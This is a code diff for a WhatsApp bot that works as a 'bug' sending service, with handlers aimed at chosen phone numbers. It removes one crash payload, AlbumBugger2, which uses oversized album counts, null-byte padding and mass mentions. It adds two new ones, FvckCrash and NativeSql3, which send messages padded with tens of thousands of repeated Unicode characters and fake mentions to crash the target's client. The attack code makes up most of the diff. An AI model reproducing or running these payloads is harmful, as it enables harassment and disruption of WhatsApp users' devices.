@@ -52,7 +52,7 @@ async function ai(prompt) {
   return new Promise((resolve, reject) => {
     let hasil = "";
     chatAi(
-      "o4-mini",
+      "gpt-5-mini",
       prompt,
       (delta) => {
         hasil += delta; 
@@ -91,27 +91,23 @@ const { imageMessage } = await generateWAMessageContent({ image: { url },}, {
   return imageMessage
 }
 
-  // event: connection update
   sock.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect } = update;
     console.log(`[${pn}] connection.update =>`, connection);
-
     if (connection === "open") {
       activeSockets.set(pn, { sock, statePath: sessionPath });
       console.log(`[${pn}] Socket saved to activeSockets (open)`);
       try {
         await delay(200);
-        await sock.sendMessage(sock.user.id, { text: "_*Berhasil terhubung ke WhatsApp!*_" });
+        const one = "Time: " + new Date().toISOString();
+        await sock.sendMessage(sock.user.id, { text: "_*Berhasil terhubung ke WhatsApp!*_\n" + one });
       } catch (e) { /* ignore send errors */ }
       return;
     }
-
     if (connection === "close") {
       const statusCode = new Boom(lastDisconnect?.error)?.output?.statusCode;
       console.log(`[${pn}] closed with code:`, statusCode);
-
       if (activeSockets.has(pn)) activeSockets.delete(pn);
-
       if (
         statusCode === DisconnectReason.connectionLost ||
         statusCode === DisconnectReason.connectionReplaced ||
@@ -125,7 +121,6 @@ const { imageMessage } = await generateWAMessageContent({ image: { url },}, {
           console.error(`[${pn}] reconnect failed:`, e);
         }
       } else if (statusCode === DisconnectReason.loggedOut) {
-        // hapus session files jika logout
         try {
           await deleteTemp(false, sessionPath);
         } catch (e) { /* ignore */ }
@@ -195,38 +190,6 @@ let mg = generateWAMessageFromContent(from,
           },
           carouselMessage: {
             cards: [
-              {
-                header: proto.Message.InteractiveMessage.Header.create({
-                  title: ``,
-                  subtitle: 'whyuxD',
-                  productMessage: {
-                    product: {
-                      productImage: await image("https://files.catbox.moe/aauj7v.webp"),
-                      productId: "9116471035103640",
-                      title: `hai`,
-                      description: "",
-                      currencyCode: "IDR",
-                      priceAmount1000: "5000200",
-                      retailerId: "4144242",
-                      url: "",
-                      productImageCount: 1,
-                    },
-                    businessOwnerJid: "6287864807845@s.whatsapp.net",
-                  },
-                  hasMediaAttachment: false
-                }),
-                body: {
-                  text: "Hei... jangan buru-buru skip... Ada sesuatu yang ingin ku kasih tau, tapi tdk bisa ditulis langsung di sini. Kalau penasaran, tekan tombol di bawah ini agar kamu mengerti maksudku. ku jamin kamu akan kaget setelah melihat isinya!!",
-                },
-                nativeFlowMessage: {
-                  buttons: [
-                    {
-"name": "quick_reply",
-"buttonParamsJson": "{\"display_text\":\"klik disini\",\"id\":\"dongo\"}"
-                    },
-                  ],
-                },
-              },
               {
                 header: proto.Message.InteractiveMessage.Header.create({
                   title: ``,
@@ -423,94 +386,70 @@ for (let iter = 1; iter <= 100; iter++) {
  }
 }
 
-async function AlbumBugger2(target)  {
-   const album = await generateWAMessageFromContent(target, {
-      albumMessage: {
-         expectedImageCount: 100000000,
-         expectedVideoCount: 0, //trigger
-      }
-   }, {});   
-   const imagePayload = {
-      imageMessage: {
-        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
-        mimetype: "image/jpeg",
-        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
-        fileLength: 99999999999,
-        height: 1280,
-        width: 720,
-        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
-        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
-        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
-        mediaKeyTimestamp: 1758521043,
-        isSampled: true, 
-        viewOnce: false, 
-        contextInfo: {
-          forwardingScore: 999,
-          isForwarded: true, 
-          forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363343611802180@newsletter", 
-            newsletterName: "whyuxD", 
-            contentType: "UPDATE_CARD", 
-            accessibilityText: "\u0000".repeat(9000), 
-            serverMessageId: 18888888
-          }, 
-          mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
-        },
-        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
-        scanLengths: [3599, 9271, 2026, 2778],
-        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=", 
-        annotations: [
-          {
-            polygonVertices: [
-              {
-                x: 0.05515563115477562,
-                y: 0.4132135510444641
-              },
-              {
-                x: 0.9448351263999939,
-                y: 0.4132135510444641
-              },
-              {
-                x: 0.9448351263999939,
-                y: 0.5867812633514404
-              },
-              {
-                x: 0.05515563115477562,
-                y: 0.5867812633514404
+async function FvckCrash(target, ptcp = true) {   
+    const trigger = "𑇂wxx1𑆵𑆴𑆿".repeat(60000);
+    const mentionedList = [
+    target, ...Array.from({ length: 35000 }, () =>
+      1${Math.floor(Math.random() * 500000)}@s.whatsapp.net
+      )
+    ];    
+    try {
+        const message = {
+            botInvokeMessage: {
+                message: {
+                    newsletterAdminInviteMessage: {
+                        newsletterJid: '1@newsletter',
+                        newsletterName: trigger,
+                        jpegThumbnail: null,
+                        caption: trigger,
+                        inviteExpiration: 9999999999999,
+                    },
+                },
+            },
+            nativeFlowMessage: {},
+            contextInfo: {
+              remoteJid: target,
+              participant: target,
+              mentionedJid: mentionedList,
+              disappearingMode: {
+                initiator: "CHANGED_IN_CHAT",
+                trigger: "CHAT_SETTING"
               }
-            ],
-            newsletter: {
-              newsletterJid: "120363343611802180@newsletter",
-              serverMessageId: 3868,
-              newsletterName: "wxx1",
-              contentType: "UPDATE_CARD",
-              accessibilityText: "\u0000".repeat(1000) 
-            }
+            },
+        };
+        await sock.relayMessage(target, message, {
+          userJid: target,
+        });
+    } catch (error) {
+        console.log("error:\n" + error);
+    }
+}
+
+async function NativeSql3(target) {
+  let msg = {
+    interactiveMessage: {
+      body: {
+        text: "¿w𝑿𝑿1 ꆜ " + "ꦾ".repeat(73000)
+      },
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "single_select",
+            buttonParamsJson: "ꦽ".repeat(55000),
+          },
+          {
+            name: "cta_url",
+            buttonParamsJson: "ꦽ".repeat(55000),
           }
         ]
-     }
-   };   
-   const messages = [];
-   for (let i = 0; i < 100; i++) {
-     const imgMsg = await generateWAMessageFromContent(target, imagePayload, {});  
-      imgMsg.message.messageContextInfo = {  
-         messageAssociation: {  
-            associationType: 1,  
-            parentMessageKey: album.key  
-         }  
-      };  
-      messages.push(imgMsg);
-   }
-   await sock.relayMessage(target, album.message, {
-      messageId: album.key.id,
-      participant: { jid: target }
-   });   
-   for (const msg of messages) {
-      await sock.relayMessage(target, msg.message, {
-         messageId: msg.key.id,
-         participant: { jid: target }
-      });
-   }
+      }
+    }
+  };
+  await sock.relayMessage(target, msg, {
+    messageId: null,
+    participant: { jid: target },
+    userJid: target
+  });
 }
 
 // ###################### //
@@ -521,12 +460,17 @@ async function AlbumBugger2(target)  {
       await OfferMpM(jid)
       return res.json({ success: true, message: "Bug telah dikirim!" });
     } else if (type === "bug_b") {
-      await AlbumBugger2(jid)
+      await NativeSql3(jid)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_c") {
-      message = "Time: " + new Date().toISOString();
-      await sock.sendMessage(jid, { text: message });
-      return res.json({ success: true, message: "Ping" });
+      await FvckCrash(jid); 
+      return res.json({ success: true, message: "Bug telah dikirim" });
+    } else if (type === "bug_d") {
+      
+      return res.json({ success: true, message: "Bug telah dikirim" });
+    } else if (type === "bug_e") {
+
+      return res.json({ success: true, message: "Bug telah dikirim" });
     } else {
       return res.status(400).json({ error: "Unknown type" });
     }
